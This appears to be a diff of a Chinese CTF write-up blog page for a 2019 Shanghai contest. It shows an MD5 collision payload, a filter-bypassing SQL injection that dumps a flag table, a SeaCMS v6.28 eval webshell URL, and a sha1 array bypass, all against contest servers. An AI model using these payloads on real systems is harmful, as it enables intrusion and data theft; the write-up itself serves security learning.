-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-3.png" alt="8-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-3.png" alt></p>
 <p><code>flag{c4es4r_variation}</code></p>
 <hr>
 <h3 id="第九题（袁殊）"><a href="#第九题（袁殊）" class="headerlink" title="第九题（袁殊）"></a>第九题（袁殊）</h3><p>RSA 摸熟 n 过小，导致可被分解的问题，先用 openssl 提取公钥中的 e 和 n</p>
@@ -301,14 +304,15 @@ print long_to_bytes(m)
 <h3 id="第十题（76号）"><a href="#第十题（76号）" class="headerlink" title="第十题（76号）"></a>第十题（76号）</h3><p>Reverse</p>
 <hr>
 <h3 id="第十一题-（晴气庆胤）"><a href="#第十一题-（晴气庆胤）" class="headerlink" title="第十一题 （晴气庆胤）"></a>第十一题 （晴气庆胤）</h3><p>查看源代码，给出了提示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-1.png" alt="11-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-1.png" alt></p>
 <p>要POST值不同的2个数，但是md5的值却要一样，参考了这篇文章：<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">不同数值构造相同MD5传送门</a></p>
 <p>按照文章步骤来，创建文本文件，写入1，命令为init.txt</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-2.png" alt="11-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-2.png" alt></p>
 <p>运行fastcoll 输入以下参数。 -p 是源文件 -o 是输出文件</p>
-<pre><code>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt
-</code></pre><p>文件生成</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-3.png" alt="11-3"></p>
+<pre><code class="Code">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt
+</code></pre>
+<p>文件生成</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-3.png" alt></p>
 <p>通过下面这个代码，生成两个hash一样，但是实际内容不一样的字符串：</p>
 <pre><code class="php">&lt;?php 
 function  readmyfile($path){
@@ -330,47 +334,55 @@ echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
 echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));
 echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-4.png" alt="11-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-4.png" alt></p>
 <p>然后直接POST提交param1和param2</p>
 <p>内容如下：</p>
-<pre><code>param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B
-</code></pre><p>拿下flag</p>
+<pre><code class="Code">param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B
+</code></pre>
+<p>拿下flag</p>
 <p><code>flag{MD5@_@success}</code></p>
 <hr>
 <h3 id="第十二题（梅津美治郎）"><a href="#第十二题（梅津美治郎）" class="headerlink" title="第十二题（梅津美治郎）"></a>第十二题（梅津美治郎）</h3><p>Reverse</p>
 <hr>
 <h3 id="第十三题（冈村宁次）"><a href="#第十三题（冈村宁次）" class="headerlink" title="第十三题（冈村宁次）"></a>第十三题（冈村宁次）</h3><p>题目的链接如下：</p>
-<pre><code>http://47.103.43.235:83/web/a/index.php?id===QM
-</code></pre><p>发现”id=”后面是奇怪的”==QM”。这其实是1经过base64加密后再逆序</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/10-1.png" alt="10-1"></p>
+<pre><code class="Code">http://47.103.43.235:83/web/a/index.php?id===QM
+</code></pre>
+<p>发现”id=”后面是奇怪的”==QM”。这其实是1经过base64加密后再逆序</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/10-1.png" alt></p>
 <p>测试发现，以下内容被检查，无法使用：</p>
-<pre><code>extractvalue()函数，updatexml()函数
+<pre><code class="Code">extractvalue()函数，updatexml()函数
 
 union,select,空格,逗号,等号
-</code></pre><p>应对策略：</p>
-<pre><code>双写：uunionnion,sselectelect
+</code></pre>
+<p>应对策略：</p>
+<pre><code class="Code">双写：uunionnion,sselectelect
 空格：使用/**/或者%09代替空格
 逗号：select()a join select ()b来代替逗号
 等号：like代替等号
-</code></pre><p>爆表名：</p>
-<pre><code>base64.b64encode(&quot;0 uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1]
+</code></pre>
+<p>爆表名：</p>
+<pre><code class="Code">base64.b64encode(&quot;0 uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1]
 
 #表名：book,flag
-</code></pre><p>爆列名：</p>
-<pre><code>base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1]
+</code></pre>
+<p>爆列名：</p>
+<pre><code class="Code">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1]
 
 #列名：flag
-</code></pre><p>爆flag值：</p>
-<pre><code>base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1]
-</code></pre><p><code>flag{s9li_1s_s0_e4sY}</code></p>
+</code></pre>
+<p>爆flag值：</p>
+<pre><code class="Code">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1]
+</code></pre>
+<p><code>flag{s9li_1s_s0_e4sY}</code></p>
 <hr>
 <h3 id="第十四题（作战计划）"><a href="#第十四题（作战计划）" class="headerlink" title="第十四题（作战计划）"></a>第十四题（作战计划）</h3><p>之前看过海洋CMS v6.28 存在代码执行漏洞，参考文章后，菜刀直接连接，密码为1：</p>
-<pre><code>http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])
-</code></pre><p>根目录下直接看到flag.txt，打开后看到flag</p>
+<pre><code class="Code">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])
+</code></pre>
+<p>根目录下直接看到flag.txt，打开后看到flag</p>
 <p><code>flag{!!seacms_@@}</code></p>
 <hr>
 <h3 id="第十五题（池步洲）"><a href="#第十五题（池步洲）" class="headerlink" title="第十五题（池步洲）"></a>第十五题（<strong>池步洲</strong>）</h3><p>查看源码，末尾提示着：index.phps，直接访问后下载到源码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/15-1.png" alt="15-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/15-1.png" alt></p>
 <p>源码如下：</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -387,7 +399,7 @@ if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){
 <p>可以看出，要求我们POST的name和password值要不同，但是sha1()后的值要相同</p>
 <p>和md5()一样，sha1()无法处理数组，直接返回空，所以就是值一样了</p>
 <p>用Burpsuits提交，直接返回flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/15-2.png" alt="15-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/15-2.png" alt></p>
 <p><code>flag{Y0u_just_br0ke_sha1}</code></p>
 <hr>
 
